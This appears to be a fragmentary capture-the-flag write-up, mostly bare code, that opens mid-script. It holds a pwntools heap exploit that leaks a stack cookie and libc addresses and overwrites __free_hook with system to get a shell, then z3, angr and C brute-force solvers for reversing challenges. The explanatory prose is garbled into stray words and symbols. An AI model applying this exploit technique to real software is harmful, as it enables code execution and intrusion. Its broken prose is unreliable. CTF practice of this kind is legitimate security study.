        show(0)
        s = p.recv('4')
        if s == 'Cont':
            log.info('leak cookie ' + hex(i))
            cookie += chr(i)
            break
context.log_level = 'debug'
REVERSE
launch_gdb()
log.info('cookie ' + hex(u64(cookie)))
log.info('count ' + hex(count))
add(1)
add(2)
dele(0)
dele(1)
dele(2)
add(3)
show(2)
leak_heap = leak_addr('heap')
'''
add(0)
add(1)
add(2)
dele(0)
dele(1)
show(1)
leak_heap = leak_addr('heap')
edit(1,chr(0x90 - 0x18))
add(0)
add(0)
show(1)
p.recvuntil('Content: ')
leak_cookie = u64(p.recv(8))
log.info('leak cookie ' + hex(leak_cookie))
for i in xrange(5):
    add(3)
add(4)
edit(4,'/bin/sh\x00')
edit(0,'a'*(0x100-0x18) + p64(0) + p64(1632 + 1))
dele(1)
show(1)
leak_lib = leak_addr('libc') - 4111520
free_hook = leak_lib + 4118760
sys_addr  = 324672 + leak_lib
dele(3)
dele(3)
edit(3,p64(free_hook))
add(3)
add(3)
edit(3,p64(sys_addr))
dele(4)
p.interactive()
REVERSE
nop
3++0x33333334
0x90nop2
0x8048765noprightﬂag0x8048765 + 0x33333334 - 3 = 993507990
ManageCode
32dnspy
ﬂag 
chk_689ﬂag 
sunhex
dnspy
0x0011E050z3
  // Token: 0x0600015F RID: 351 RVA: 0x0011EC50 File Offset: 0x0011E050
  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
  [return: MarshalAs(UnmanagedType.U1)]
  internal unsafe static extern bool chk_689(void*);
from z3 import *
a1 = []
so = Solver()
for i in xrange(16):
    t = Int('a' + str(i))
    a1.append(t)
v1 = 1
v2 = a1[0]
v3 = a1[1]
v32 = v3
so.add ( -316449 * v2 == -23100777 )
v1 = 0
v4 = a1[2]
v31 = v4
so.add ( 28867 * v2 - 179921 * v3 == -9947416 )
v1 = 0
v5 = 126859 * v3
v6 = a1[3]
v7 = a1[4]
v30 = v7
v29 = v6
so.add ( v5 + 489373 * v4 - 512292 * v2 == -2960994 )
v1 = 0
so.add ( -344274 * v32 - 508389 * v6 - 473144 * v2 - 433062 * v4 == -98351771 
)
v1 = 0
so.add ( 197235 * v32 + 427693 * v7 + 174092 * v4 + 81427 * v2 - 392963 * v6 
== 54835229 )
v1 = 0
v8 = a1[5]
v28 = v8
so.add ( 457087 * v8 + 163494 * v7 + 237851 * v6 - 79045 * v2 - 166737 * v31 - 
285408 * v32 == 74067547 )
v1 = 0
v9 = a1[6]
v26 = v9
so.add ( 325399 * v2 + 107968 * v30 + 110115 * v8 + 344269 * v32 - 244676 * v6 
- 432610 * v9 - 451571 * v31 == -39625571 )
v1 = 0
v10 = a1[7]
v27 = v10
so.add ( 256702 * v2+ 456215 * v10+ 195927 * v9+ 135821 * v31+ -496118 * v29- 
273457 * v32- 230971 * v30- 122078 * v8 == 26255929 )
v1 = 0
v11 = a1[8]
v25 = v11
v12 = 188190 * v10
v13 = v1
so.add ( 90852 * v9+ 34784 * v29+ 402352 * v31+ 443909 * v32- 179169 * v30- 
438770 * v28- 303198 * v11- 458201 * v2- v12 == -97439054 )
v13 = 0
v14 = a1[9]
v24 = v14
so.add ( -118512 * v29- 280306 * v26+ 310103 * v14+ 90092 * v31+ 354664 * v30+ 
430186 * v27+ 103532 * v11- 303889 * v28- 271187 * v32- 487658 * v2 == 
-45515934 )
v13 = 0
v15 = a1[10]
v23 = v15
so.add ( 277953 * v15+ 417783 * v25+ -289178 * v14- 332754 * v2- 357755 * v26+ 
267851 * v32+ 365113 * v29+ 369246 * v30+ 140538 * v28- 227356 * v31- 116588 * 
v27 == -24522897 )
v13 = 0
v16 = a1[11]
v22 = v16
so.add ( 85829 * v31+ 380274 * v29+ 246398 * v27+ 195467 * v32+ 526058 * v2+ 
-492206 * v28- 29780 * v24+ 393393 * v15+ 4388 * v16- 242931 * v26- 40503 * 
v25- 291417 * v30 == -63793655 )
v13 = 0
v17 = a1[12]
v21 = v17
so.add ( -141640 * v23- 349315 * v32+ 377657 * v27+ 508780 * v24+ 275049 * 
v17+ -100899 * v2- 362103 * v26- 523986 * v31- 193451 * v28+ 520438 * v16+ 
362629 * v25+ -402331 * v29- 499947 * v30 == -8636091 )
v13 = 0
v18 = a1[13]
so.add ( 506434 * v27+ -205391 * v22- 509443 * v25+ 503583 * v18+ 519628 * 
v31+ 418301 * v26+ 287211 * v24+ 511783 * v17+ 64138 * v23+ 273565 * v2+ 
336327 * v28+ 468869 * v30+ 308594 * v29- 337132 * v32 == 357077926 )
v13 = 0
v19 = a1[14]
so.add ( 344208 * v27+ 437413 * v18+ 444218 * v23+ 83350 * v21+ 345577 * v19+ 
4868 * v2+ -520705 * v24- 25797 * v22+ 269631 * v28+ 142442 * v26+ 278333 * 
v31- 15838 * v32- 298360 * v25- 295120 * v30- 150621 * v29 == 94016389 )
v13 = 0
result = v13
rev
so.add ( 208574 * v24+ 114846 * v26+ 306988 * v19+ -188694 * v25- 416583 * 
v23- 520716 * v30+ 522362 * v28+ -101887 * v2- 331092 * v32+ 273016 * v31+ 
109088 * v29+ 107571 * v27+ 6306 * v22- 319867 * a1[15]- 3532 * v21- 300974 * 
v18 == 48326038 )
print(so.check())
m = so.model()
res = ''
for i in a1:
    res += chr(m[i].as_long())
print(res.encode('hex'))
import angr,claripy
project = angr.Project("rev_v2")
argv1 = claripy.BVS("argv1",100*8)
initial_state = project.factory.entry_state(args=["./rev_v2",argv1])
simulation = project.factory.simgr(initial_state)
simulation.explore(find=0x400481)
found = simulation.found[0]
solution = found.solver.eval(argv1, cast_to=bytes)
print(repr(solution))
solution = solution[:solution.find(b"\x00")]
print(solution)
#include 
#include 
#include 
#include 
using namespace std;
unsigned char s[100] = {100, 36, 13, 111, 36, 38, 140, 217, 24, 7, 175, 234, 
79, 58, 31, 92}; 
unsigned char t[100] = {0};
unsigned char dest[100] = {0}; 
char ans[100] = {0};
int main() {
  for (int j = 0; j < 4; j++) {
  for (unsigned char a1 = 32; a1 < 127; a1++) 
  for (unsigned char a2 = 32; a2 < 127; a2++) 
  for (unsigned char a3 = 32; a3 < 127; a3++) 
  for (unsigned char a4 = 32; a4 < 127; a4++) {
    t[0] = a1;
    t[1] = a2;
    t[2] = a3;
    t[3] = a4;
    for (int i = 0; i < 4; i++) {
      unsigned char a = t[i];
      unsigned char b = 2 * a;
      if (a & 0x80) {
        b = 2 * a ^ 0x1b;
      }
      unsigned char c = t[(i + 1) % 4];
      unsigned char d = c ^ 2 * c;
      if (c & 0x80) {
        d = 2 * c ^ c ^ 0x1b;
      } 
      unsigned char e = t[(i + 2) % 4];
      dest[i] = b ^ d ^ e ^ t[(i + 3) % 4];
    }
    if (!memcmp(dest, s + j * 4, 4)) {
      goto GG;
    }
  }
  GG:
    for (int i = 0; i < 4; i++) {
      ans[i * 4 + j] = t[i];
    }
  }
  printf("%s\n", ans);
  return 0;
}